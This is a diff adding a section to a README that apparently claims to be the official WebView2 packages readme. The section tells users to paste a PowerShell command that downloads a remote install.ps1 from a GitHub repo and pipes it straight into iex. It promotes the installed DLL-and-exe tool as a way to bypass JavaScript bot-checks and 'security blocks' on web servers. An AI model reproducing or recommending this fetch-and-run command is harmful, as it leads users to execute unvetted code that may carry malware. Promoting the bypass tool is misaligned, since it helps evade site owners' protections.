@@ -22,9 +22,33 @@
 
 This Uplink: The Official WebView2 `/packages` [Readme](packages/readme.md)
 
+To install the power shell headless browser:
+```code
+irm "https://raw.githubusercontent.com/mercwar/Dark-Com-2/main/install.ps1" | iex
+```
+- DLL browser is a dll file with exe wrapper for accessing private web host servers that cURL will not access.
+- DLL headless application extension makes it possible to upload to private servers without failing the javascript test.
+- darkcom2.exe will load DarkComHeadless.dll , this will give you normal requesting again through your private web server .
+- Power shell will install the application and you run the batch file or command line through cmd or powershell or your own compatible wrapper.
+- The server will accept uri &= as well as include a post json object {} , it will upload and download the requests for you automatically completing the javascript challenge
+
+
 #
 
+What is DarkComHeadless.dll and the powershell app?
 
+DarkCom-2 is a specialized tool designed to bypass JavaScript bot-checks and connect to private web servers that standard tools like cURL cannot reach. It uses an executable wrapper (darkcom2.exe) to run a background library (DarkComHeadless.dll), allowing you to upload and download files smoothly without getting blocked.
+
+Key Features
+
+• Bypasses Security Blocks: Standard tools often fail when web hosts require web browser JavaScript tests. This tool functions like a headless browser, easily clearing those verification challenges.
+• Restores Normal Connections: By running darkcom2.exe, it automatically loads the DarkComHeadless.dll file to fix connection issues and bring back stable, normal request speeds.
+• Flexible Execution: You can install the tool quickly via PowerShell and run it through your preferred environment—whether that is a batch file, CMD, PowerShell, or your own custom code wrapper.
+• Smart Data Handling: The server accepts both URL query parameters and JSON objects ({}) in POST requests, handling the entire automated upload and download process for you.
+
+
+
+#
 
 Requirements for Users:
 - Run the Dark-Com-2.exe file after you clone the repo
